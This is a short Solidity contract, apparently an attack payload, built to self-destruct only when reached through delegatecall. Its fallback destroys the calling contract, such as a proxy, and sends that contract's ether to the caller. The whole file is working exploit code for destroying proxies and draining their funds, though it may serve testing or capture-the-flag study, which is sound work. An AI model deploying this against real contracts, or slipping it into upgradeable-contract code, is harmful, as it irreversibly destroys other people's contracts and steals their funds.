// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.0 <=0.8.19;

contract Himiko {
    address private immutable blacklisted;

    constructor() {
        blacklisted = address(this);
    }

    function destroyDelegator(address payable recipient) public payable {
        require(address(this) != blacklisted);
        selfdestruct(recipient);
    }

    fallback() external payable {
        destroyDelegator(payable(address(msg.sender)));
    }
}